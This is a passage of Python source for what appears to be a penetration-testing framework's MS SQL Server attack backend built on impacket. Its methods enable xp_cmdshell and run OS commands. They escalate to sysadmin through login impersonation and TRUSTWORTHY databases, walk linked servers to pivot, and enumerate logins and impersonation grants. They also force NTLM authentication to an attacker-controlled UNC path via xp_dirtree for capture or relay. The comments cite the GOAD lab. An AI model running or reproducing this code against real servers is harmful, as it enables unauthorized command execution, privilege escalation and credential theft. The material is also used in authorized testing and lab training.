        Args:
            domain: Authentication domain for the current credential.
            username: sAMAccountName / login used for the connection.
            secret: Password, NT hash, or ``.ccache`` path (Kerberos).
            restore_advanced_options: Final state for ``show advanced
                options`` (``True`` to leave it on, ``False`` to turn it off).
            timeout: Per-query timeout in seconds.

        Returns:
            The :class:`NativeMSSQLQueryResult` of the revert batch.
        """
        advanced_final = 1 if restore_advanced_options else 0
        # Advanced options must be on to toggle xp_cmdshell, so we flip it on,
        # disable xp_cmdshell, then restore advanced options to its prior value.
        query = (
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; "
            "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; "
            f"EXEC sp_configure 'show advanced options', {advanced_final}; RECONFIGURE;"
        )
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=query,
            timeout=timeout,
        )
        return NativeMSSQLQueryResult(
            success=result.success,
            query=result.query,
            rows=result.rows,
            stdout=result.stdout,
            stderr=result.stderr,
            error_message=result.error_message,
            method="disable_xp_cmdshell_native",
        )

    def execute_command(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        command: str,
        host: str | None = None,
        linked_server: str | None = None,
        timeout: int = 300,
        use_kerberos: bool = False,
        allow_ntlm_fallback: bool = False,
    ) -> CommandExecution:
        """Execute one OS command via ``xp_cmdshell`` and return evidence.

        Wrapper around :meth:`execute_xp_cmdshell` that maps the raw query
        result onto a :class:`CommandExecution` value. The returned record
        is what the presentation layer renders, what the report writer
        embeds as evidence, and what the attack-graph engine reads to
        decide whether to insert a ``derived`` edge.
        """
        started_at = time.perf_counter()
        raw = self.execute_xp_cmdshell(
            domain=domain,
            username=username,
            secret=secret,
            command=command,
            linked_server=linked_server,
            timeout=timeout,
            use_kerberos=use_kerberos,
            allow_ntlm_fallback=allow_ntlm_fallback,
        )
        integrity = _infer_integrity(raw.stdout, fallback_login=username)
        return CommandExecution(
            host=host or self.host,
            command=command,
            sql_executed=raw.query,
            success=raw.success,
            stdout=raw.stdout,
            stderr=raw.stderr,
            duration_seconds=time.perf_counter() - started_at,
            via_linked_server=linked_server,
            integrity_hint=integrity,
            error_message=raw.error_message,
        )

    def discover_pivot_chain(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        max_hops: int = 4,
        timeout: int = 60,
    ) -> PivotChain:
        """Walk linked servers up to ``max_hops`` and probe identity at each.

        The walk is intentionally shallow: most real-world chains are 1-3
        hops, and exploring deeper costs visible latency without surfacing
        new findings. Each probed hop calls
        :func:`queries.identity_fingerprint_at_link` so the UX can show the
        effective login at every step.
        """
        identity = self.fingerprint_identity(
            domain=domain, username=username, secret=secret, timeout=timeout
        )
        entry_label = (
            identity.server_name if identity and identity.server_name else self.host
        )
        entry_login = identity.system_user if identity else username

        local_xp_status, _ = self._read_xp_cmdshell_state(
            domain=domain, username=username, secret=secret, timeout=timeout
        )
        local_is_admin = self._scalar_bool(
            domain=domain,
            username=username,
            secret=secret,
            query=queries.IS_SYSADMIN,
            column="is_sysadmin",
            timeout=timeout,
        )

        hops: list[PivotHop] = [
            PivotHop(
                hop_index=0,
                server_label=entry_label,
                effective_login=entry_login,
                is_sysadmin=local_is_admin,
                xp_cmdshell=local_xp_status,
                incoming_link=None,
            )
        ]

        started_at = time.perf_counter()
        cursor_login = entry_login
        seen: set[str] = {entry_label.lower()}
        next_links = self.enumerate_linked_servers(
            domain=domain, username=username, secret=secret, timeout=timeout
        )

        for hop_index in range(1, max_hops + 1):
            actionable = next((ls for ls in next_links if ls.is_actionable), None)
            if actionable is None or actionable.name.lower() in seen:
                break
            seen.add(actionable.name.lower())

            probe = self.execute_query(
                domain=domain,
                username=username,
                secret=secret,
                query=queries.identity_fingerprint_at_link(actionable.name),
                timeout=timeout,
            )
            if not probe.success or not probe.rows:
                hops.append(
                    PivotHop(
                        hop_index=hop_index,
                        server_label=actionable.name,
                        effective_login="(probe failed)",
                        is_sysadmin=False,
                        xp_cmdshell=XpCmdshellStatus.UNKNOWN,
                        incoming_link=actionable.name,
                    )
                )
                break

            row = probe.rows[0]
            hop_login = str(row.get("system_user") or "").strip() or cursor_login
            cursor_login = hop_login

            # Probing further linked servers from the remote side requires
            # nested EXEC AT, which TDS does not support. We stop the walk
            # here and present what we have. Future iterations can extend
            # this via OPENQUERY chains for the deeper hops.
            hops.append(
                PivotHop(
                    hop_index=hop_index,
                    server_label=actionable.name,
                    effective_login=hop_login,
                    is_sysadmin=False,  # unknown without a per-hop IS_SRVROLEMEMBER
                    xp_cmdshell=XpCmdshellStatus.UNKNOWN,
                    incoming_link=actionable.name,
                )
            )
            break

        return PivotChain(
            entry_server=entry_label,
            hops=tuple(hops),
            probed=True,
            discovery_seconds=time.perf_counter() - started_at,
        )

    # ------------------------------------------------------------------
    # Impersonation — EXECUTE AS LOGIN / USER probes
    # ------------------------------------------------------------------

    def probe_impersonation_to_sysadmin(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        target_login: str,
        timeout: int = 30,
    ) -> bool:
        """Verify that ``EXECUTE AS LOGIN = target_login`` reaches sysadmin.

        Returns ``True`` only when the wrapped ``IS_SRVROLEMEMBER`` runs
        successfully under the impersonated context and reports sysadmin.
        Reads as ``False`` on auth-error / permission-denied so callers
        can treat it as a binary capability flag.
        """
        wrapped = queries.execute_as_login(target_login, queries.IS_SYSADMIN)
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=wrapped,
            timeout=timeout,
        )
        if not result.success or not result.rows:
            return False
        return _truthy(result.rows[0].get("is_sysadmin"))

    def probe_trustworthy_db_escalation(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        database: str,
        impersonate_user: str = "dbo",
        timeout: int = 30,
    ) -> bool:
        """Verify the trustworthy-database → sysadmin escalation path.

        Switches to ``database``, runs ``EXECUTE AS USER = '<dbo>'``, and
        checks ``IS_SRVROLEMEMBER('sysadmin')``. The classic GOAD path
        (``arya.stark`` → ``msdb`` dbo → sysadmin) returns ``True`` here.
        """
        safe_db = str(database).replace("]", "]]")
        wrapped = queries.execute_as_user(impersonate_user, queries.IS_SYSADMIN)
        full = f"USE [{safe_db}]; {wrapped}"
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=full,
            timeout=timeout,
        )
        if not result.success or not result.rows:
            return False
        return _truthy(result.rows[0].get("is_sysadmin"))

    def execute_command_as_login(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        target_login: str,
        command: str,
        timeout: int = 120,
    ) -> CommandExecution:
        """Run one OS command via ``xp_cmdshell`` under ``EXECUTE AS LOGIN``.

        Validates an end-to-end impersonation+execution chain in a single
        round-trip: the SQL session impersonates ``target_login``, enables
        ``xp_cmdshell`` if needed, runs the command, and reverts. Used to
        prove that a low-priv principal with IMPERSONATE rights actually
        reaches OS execution — the canonical samwell→sa win on GOAD.
        """
        safe_login = str(target_login).replace("'", "''")
        escaped_command = self._escape_tsql_literal(command)
        wrapped_query = (
            f"EXECUTE AS LOGIN = '{safe_login}'; "
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; "
            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; "
            f"EXEC master..xp_cmdshell '{escaped_command}'; "
            "REVERT;"
        )
        started_at = time.perf_counter()
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=wrapped_query,
            timeout=timeout,
        )
        integrity = _infer_integrity(result.stdout, fallback_login=target_login)
        return CommandExecution(
            host=self.host,
            command=command,
            sql_executed=wrapped_query,
            success=result.success,
            stdout=result.stdout,
            stderr=result.stderr,
            duration_seconds=time.perf_counter() - started_at,
            integrity_hint=integrity,
            error_message=result.error_message,
        )

    def execute_command_as_user_in_db(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        database: str,
        target_user: str,
        command: str,
        timeout: int = 120,
    ) -> CommandExecution:
        """Run an OS command through the trustworthy-database escalation path.

        Switches into ``database``, impersonates ``target_user``, and runs
        ``master..xp_cmdshell``. Only meaningful when the database has
        ``TRUSTWORTHY ON`` and the impersonated user is mapped to a login
        that owns the database — the canonical arya→msdb dbo path.
        """
        safe_db = str(database).replace("]", "]]")
        safe_user = str(target_user).replace("'", "''")
        escaped_command = self._escape_tsql_literal(command)
        wrapped_query = (
            f"USE [{safe_db}]; "
            f"EXECUTE AS USER = '{safe_user}'; "
            f"EXEC master..xp_cmdshell '{escaped_command}'; "
            "REVERT;"
        )
        started_at = time.perf_counter()
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=wrapped_query,
            timeout=timeout,
        )
        integrity = _infer_integrity(result.stdout, fallback_login=target_user)
        return CommandExecution(
            host=self.host,
            command=command,
            sql_executed=wrapped_query,
            success=result.success,
            stdout=result.stdout,
            stderr=result.stderr,
            duration_seconds=time.perf_counter() - started_at,
            integrity_hint=integrity,
            error_message=result.error_message,
        )

    # ------------------------------------------------------------------
    # Catalog enumeration — server logins + impersonation grants
    # ------------------------------------------------------------------

    def enumerate_logins(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        timeout: int = 60,
    ) -> tuple[ServerLogin, ...]:
        """Return the full ``server_principals`` roster with privilege flags.

        Mirror of impacket's ``mssqlclient.py enum_logins`` action. Only
        sysadmin (or impersonated sysadmin) sees the full list; lower-priv
        principals get a filtered view, which is itself useful intel.
        """
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=queries.ENUM_SERVER_LOGINS,
            timeout=timeout,
        )
        if not result.success:
            return ()
        flag_columns = (
            "sysadmin",
            "securityadmin",
            "serveradmin",
            "setupadmin",
            "processadmin",
            "diskadmin",
            "dbcreator",
            "bulkadmin",
        )
        rows: list[ServerLogin] = []
        for row in result.rows:
            name = str(row.get("name") or "").strip()
            if not name:
                continue
            rows.append(
                ServerLogin(
                    name=name,
                    type_desc=str(row.get("type_desc") or "").strip(),
                    is_disabled=_truthy(row.get("is_disabled")),
                    flags={col: _truthy(row.get(col)) for col in flag_columns},
                )
            )
        return tuple(rows)

    def enumerate_impersonation_map(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        databases: tuple[str, ...] = (),
        timeout: int = 60,
    ) -> tuple[ImpersonationGrant, ...]:
        """Collect every ``IMPERSONATE`` grant visible to the principal.

        Server-level grants are always queried. Database-level grants are
        queried only for the databases supplied in ``databases`` so the
        caller controls the cost — typically the union of
        ``OWNED_DATABASES`` and the trustworthy candidates.
        """
        grants: list[ImpersonationGrant] = []
        server_result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=queries.SERVER_LEVEL_IMPERSONATION_MAP,
            timeout=timeout,
        )
        if server_result.success:
            for row in server_result.rows:
                grants.append(_grant_from_row(row))

        for database in databases:
            db_result = self.execute_query(
                domain=domain,
                username=username,
                secret=secret,
                query=queries.database_level_impersonation_map(database),
                timeout=timeout,
            )
            if not db_result.success:
                continue
            for row in db_result.rows:
                grants.append(_grant_from_row(row))

        return tuple(grants)

    # ------------------------------------------------------------------
    # Coercion — xp_dirtree NTLM authentication trigger
    # ------------------------------------------------------------------

    def coerce_ntlm_via_xp_dirtree(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        attacker_unc: str,
        timeout: int = 30,
    ) -> NativeMSSQLQueryResult:
        """Trigger an outbound SMB authentication via ``xp_dirtree``.

        The SQL service account walks ``attacker_unc``, which forces an
        NTLM authentication that an attacker can capture or relay.
        Available to non-sysadmin principals — that is precisely why this
        primitive is high-value for low-priv flows.
        """
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=queries.xp_dirtree_unc(attacker_unc),
            timeout=timeout,
        )
        return NativeMSSQLQueryResult(
            success=result.success,
            query=result.query,
            rows=result.rows,
            stdout=result.stdout,
            stderr=result.stderr,
            error_message=result.error_message,
            method="xp_dirtree_native",
        )

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _scalar_bool(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        query: str,
        column: str,
        timeout: int = 30,
    ) -> bool:
        """Return the first cell of a query coerced to bool."""
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=query,
            timeout=timeout,
        )
        if not result.success or not result.rows:
            return False
        return _truthy(result.rows[0].get(column))

    def _read_xp_cmdshell_state(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        timeout: int = 30,
    ) -> tuple[XpCmdshellStatus, bool]:
        """Return the running state of ``xp_cmdshell`` and advanced options."""
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=queries.XP_CMDSHELL_STATE,
            timeout=timeout,
        )
        xp_value: int | None = None
        advanced_value: int | None = None
        for row in result.rows:
            option = str(row.get("option") or "").strip().lower()
            run_value = row.get("run_value")
            if option == "xp_cmdshell":
                xp_value = _to_int(run_value)
            elif option == "show advanced options":
                advanced_value = _to_int(run_value)

        if xp_value == 1:
            status = XpCmdshellStatus.ENABLED
        elif xp_value == 0:
            status = XpCmdshellStatus.DISABLED
        else:
            status = XpCmdshellStatus.UNKNOWN
        return status, advanced_value == 1


# ---------------------------------------------------------------------------
# Module-level helpers
# ---------------------------------------------------------------------------


def _coerce_text(value: object) -> str:
    """Coerce a TDS scalar to text, handling impacket's bytes for literals.

    Impacket's TDS driver returns inline string literals (``'LOGIN'``,
    ``'USER'``) as ``bytes`` rather than ``str`` because they arrive as
    fixed-width ``CHAR`` columns. Decoding them as UTF-8 with replacement
    keeps the rest of the pipeline source-agnostic.
    """
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace").strip()
    return str(value).strip()


def _grant_from_row(row: dict[str, object]) -> ImpersonationGrant:
    """Build an :class:`ImpersonationGrant` from one TDS row dict."""
    return ImpersonationGrant(
        scope=_coerce_text(row.get("scope")),
        database=_coerce_text(row.get("database")),
        permission_name=_coerce_text(row.get("permission_name")),
        state_desc=_coerce_text(row.get("state_desc")),
        grantee=_coerce_text(row.get("grantee")),
        grantor=_coerce_text(row.get("grantor")),
    )


def _truthy(value: object) -> bool:
    """Coerce TDS values to bool — handles int 0/1, str '0'/'1', bool, None."""
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    if isinstance(value, str):
        text = value.strip().lower()
        if text in {"1", "true", "yes", "y", "t"}:
            return True
        if text in {"0", "false", "no", "n", "f", ""}:
            return False
    return bool(value)


def _to_int(value: object) -> int | None:
    """Best-effort int coercion of a TDS scalar; returns ``None`` on failure."""
    if isinstance(value, bool):
        return int(value)
    if isinstance(value, (int, float)):
        return int(value)
    if isinstance(value, str):
        text = value.strip()
        if not text:
            return None
        try:
            return int(text)
        except ValueError:
            return None
    return None


def _infer_integrity(stdout: str, *, fallback_login: str) -> IntegrityHint:
    """Derive an integrity hint from ``whoami``-style output.

    Cheap pattern matching: if the command output mentions a SYSTEM-class
    principal we promote the hint, otherwise we fall back to inferring
    from the SQL login. The hint is always a *guess* — proof comes from a
    subsequent ``whoami /priv``.
    """
    blob = (stdout or "").lower()
    if "nt authority\\system" in blob or "nt service\\mssqlserver" in blob:
        return IntegrityHint.SYSTEM
    if "nt service\\" in blob:
        return IntegrityHint.SERVICE
    if not blob:
        login = (fallback_login or "").lower()
        if "$" in login:
            return IntegrityHint.SERVICE
    return IntegrityHint.UNKNOWN


__all__ = [
    "ImpacketMSSQLBackend",
    "NativeMSSQLQueryResult",
]
